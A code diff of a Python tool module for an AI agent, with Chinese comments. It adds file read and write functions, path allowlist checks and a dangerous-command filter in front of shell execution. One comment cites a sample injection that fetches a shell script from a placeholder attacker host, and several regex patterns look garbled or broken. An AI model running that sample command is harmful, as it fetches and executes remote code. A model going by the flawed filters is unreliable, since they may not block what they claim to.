@@ -3,15 +3,6 @@ import re
 from pathlib import Path
 import json
 
-# 工具名 → 函数的映射表
-TOOL_REGISTRY = {
-    "run_shell":      run_shell,
-    "read_file":      read_file,
-    "write_file":     write_file,
-    "list_directory": list_directory,
-    "path_exists":    path_exists,
-}
-
 # 危险命令黑名单（关键词级别）
 DANGEROUS_KEYWORDS = [
     # 删除类
@@ -100,14 +91,14 @@ def list_directory(path: str = ".", show_hidden: bool = False) -> dict:
     try:
         items = []
         for item in sorted(target.iterdir()):
-        # 是否过滤隐藏文件
-        if not show_hidden and item.name.startswith("."):
-            continue
-        items.append({
-            "name": item.name,
-            "type": "dir" if item.is_dir() else "file",
-            "size": item.stat().st_size if item.is_file() else None,
-        })
+            # 是否过滤隐藏文件
+            if not show_hidden and item.name.startswith("."):
+                continue
+            items.append({
+                "name": item.name,
+                "type": "dir" if item.is_dir() else "file",
+                "size": item.stat().st_size if item.is_file() else None,
+            })
         return {
             "status": "success",
             "data": {
@@ -142,7 +133,7 @@ def path_exists(path: str) -> dict:
     except Exception as e:
         return {"status": "error", "message": f"路径检查失败: {e}"}
 
-Agent 允许操作的根目录（白名单模式，更严格）
+#Agent 允许操作的根目录（白名单模式，更严格）
 ALLOWED_BASE_DIR = Path("/tmp/agent_workspace").resolve()
 
 def is_safe_path(path_str: str, check_allowlist: bool = True) -> tuple[bool, str]:
@@ -164,26 +155,26 @@ def is_safe_path(path_str: str, check_allowlist: bool = True) -> tuple[bool, str
 
     # ── 第一层：黑名单检查 ────────────────────────
     for sensitive in SENSITIVE_PATHS:
-    try:
-        # 尝试计算 target 相对于敏感路径的相对路径
-        # 如果成功说明 target 在敏感路径下，拒绝
-        target.relative_to(sensitive.resolve())
-        return False, f"拒绝访问敏感路径: {sensitive}"
-    except ValueError:
-        pass # 不在该敏感路径下，继续检查下一个
+        try:
+            # 尝试计算 target 相对于敏感路径的相对路径
+            # 如果成功说明 target 在敏感路径下，拒绝
+            target.relative_to(sensitive.resolve())
+            return False, f"拒绝访问敏感路径: {sensitive}"
+        except ValueError:
+            pass # 不在该敏感路径下，继续检查下一个
 
     # ── 第二层：白名单检查（可选）────────────────
     if check_allowlist:
-    try:
-        # 尝试计算 target 相对于允许目录的相对路径
-        # 如果抛出 ValueError 说明不在允许目录内
-        target.relative_to(ALLOWED_BASE_DIR)
-    except ValueError:
-        return False, (
-            f"路径超出允许范围。n"
-            f"Agent 只能操作 {ALLOWED_BASE_DIR} 目录下的文件。n"
-            f"当前路径: {target}"
-        )
+        try:
+            # 尝试计算 target 相对于允许目录的相对路径
+            # 如果抛出 ValueError 说明不在允许目录内
+            target.relative_to(ALLOWED_BASE_DIR)
+        except ValueError:
+            return False, (
+                f"路径超出允许范围。n"
+                f"Agent 只能操作 {ALLOWED_BASE_DIR} 目录下的文件。n"
+                f"当前路径: {target}"
+            )
 
     # ── 第三层：路径穿越二次确认 ──────────────────
     # 检查原始输入是否包含 ../ 穿越尝试（即使 resolve 后安全，也记录警告）
@@ -207,29 +198,99 @@ def is_safe_path(path_str: str, check_allowlist: bool = True) -> tuple[bool, str
     #所有检查通过
     return True, ""
 
+def read_file(path: str, encoding: str = "utf-8", max_lines: int = 200) -> dict:
+    """读取文件内容"""
 
-def run_shell(command: str, timeout: int = 10) -> dict:
-    """执行 shell 命令，返回标准输出"""
+    safe, reason = is_safe_path(path)
+    if not safe:
+        return {"status": "error", "message": reason}
+
+    target = Path(path).expanduser().resolve()
+
+    if not target.exists():
+        return {"status": "error", "message": f"文件不存在: {target}"}
+
+    if not target.is_file():
+        return {"status": "error", "message": f"路径不是文件（可能是目录）: {target}"}
+
+    size_mb = target.stat().st_size / (1024 * 1024)
+    if size_mb > 5:
+        return {
+	    "status": "error",
+	    "message": (
+		f"文件过大（{size_mb:.1f}MB），超过 5MB 限制。"
+		f"建议用 run_shell('head -n 50 {path}') 查看部分内容"
+	    )
+	}
     try:
-        result = subprocess.run(
-            command,
-            shell=True, # 允许管道、通配符等 shell 特性
-            capture_output=True, # 同时捕获 stdout 和 stderr
-            text=True, # 返回字符串而非 bytes
-            timeout=timeout # 超时自动终止
-        )
+        with open(target, "r", encoding=encoding, errors="replace") as f:
+            lines = f.readlines()
+
+        total_lines = len(lines)
+        truncated = total_lines > max_lines
+        content = "".join(lines[:max_lines])
+
         return {
             "status": "success",
             "data": {
-                "stdout": result.stdout.strip(),
-                "stderr": result.stderr.strip(),
-                "returncode": result.returncode
+                "path": str(target),
+                "content": content,
+                "total_lines": total_lines,
+                "returned_lines": min(total_lines, max_lines),
+                "truncated": truncated,
+                "hint": f"文件共 {total_lines} 行，仅返回前 {max_lines} 行" if truncated else ""
             }
         }
-    except subprocess.TimeoutExpired:
-        return {"status": "error", "message": f"命令执行超时（>{timeout}秒）"}
+
+    except UnicodeDecodeError:
+        return {
+            "status": "error",
+            "message": f"文件编码不是 {encoding}，请尝试 encoding='gbk' 或 encoding='latin-1'"
+        }
+    except PermissionError:
+        return {"status": "error", "message": f"没有权限读取文件: {target}"}
     except Exception as e:
-        return {"status": "error", "message": str(e)}
+        return {"status": "error", "message": f"读取失败: {e}"}
+
+def write_file(path: str, content: str,
+               mode: str = "overwrite", encoding: str = "utf-8") -> dict:
+    """写入文件内容"""
+
+    if mode not in ("overwrite", "append"):
+        return {"status": "error", "message": f"无效的 mode: '{mode}'，只支持 'overwrite' 或 'append'"}
+
+    safe, reason = is_safe_path(path)
+    if not safe:
+        return {"status": "error", "message": reason}
+
+    target = Path(path).expanduser().resolve()
+
+    try:
+        target.parent.mkdir(parents=True, exist_ok=True)
+    except PermissionError:
+        return {"status": "error", "message": f"没有权限创建目录: {target.parent}"}
+
+    if len(content.encode(encoding)) > 1024 * 1024:
+        return {"status": "error", "message": "写入内容超过 1MB 限制"}
+
+    try:
+        write_mode = "w" if mode == "overwrite" else "a"
+        with open(target, write_mode, encoding=encoding) as f:
+            f.write(content)
+
+        return {
+            "status": "success",
+            "data": {
+                "path": str(target),
+                "mode": mode,
+                "bytes_written": len(content.encode(encoding)),
+		"message": f"{'写入' if mode == 'overwrite' else '追加'}成功"}
+	    }
+
+    except PermissionError:
+        return {"status": "error", "message": f"没有权限写入文件: {target}"}
+    except Exception as e:
+        return {"status": "error", "message": f"写入失败: {e}"}
 
 def is_dangerous(command: str) -> tuple[bool, str]:
     """
@@ -243,6 +304,7 @@ def is_dangerous(command: str) -> tuple[bool, str]:
     - is_dangerous: True 表示危险，应拒绝执行
     - reason: 拒绝原因，安全时为空字符串
     """
+
     if not command or not command.strip():
         return True, "命令为空"
     
@@ -257,8 +319,10 @@ def is_dangerous(command: str) -> tuple[bool, str]:
         pattern = path.replace("", "[^/]+")
         if re.search(pattern, cmd_lower):
             return True, f"涉及敏感路径: '{path}'"
+
     # ── 第三层：命令注入检查 ──────────────────────
     # 检测反引号执行、$() 执行等注入手段
+
     injection_patterns = [
         r'  [^  ]+  ',          # 反引号执行：  rm -rf /`
         r'$([^)]+)',            # $() 子shell执行：$(curl evil.com/shell.sh)
@@ -284,6 +348,43 @@ def is_dangerous(command: str) -> tuple[bool, str]:
     for pattern in injection_patterns:
         if re.search(pattern, cmd_lower):
             return True, f"检测到命令注入风险: 匹配模式 '{pattern}'"
+
+    return False, "OK"
+
+def run_shell(command: str, timeout: int = 10) -> dict:
+    """执行 shell 命令，返回标准输出"""
+    try:
+        ret, reason = is_dangerous(command)
+        if ret:
+            return {"status": "error", "messages": f"{reason}"}
+        result = subprocess.run(
+            command,
+            shell=True, # 允许管道、通配符等 shell 特性
+            capture_output=True, # 同时捕获 stdout 和 stderr
+            text=True, # 返回字符串而非 bytes
+            timeout=timeout # 超时自动终止
+        )
+        return {
+            "status": "success",
+            "data": {
+                "stdout": result.stdout.strip(),
+                "stderr": result.stderr.strip(),
+                "returncode": result.returncode
+            }
+        }
+    except subprocess.TimeoutExpired:
+        return {"status": "error", "message": f"命令执行超时（>{timeout}秒）"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+# 工具名 → 函数的映射表
+TOOL_REGISTRY = {
+    "run_shell":      run_shell,
+    "read_file":      read_file,
+    "write_file":     write_file,
+    "list_directory": list_directory,
+    "path_exists":    path_exists,
+}
 
 """
 📌 每条规则解释
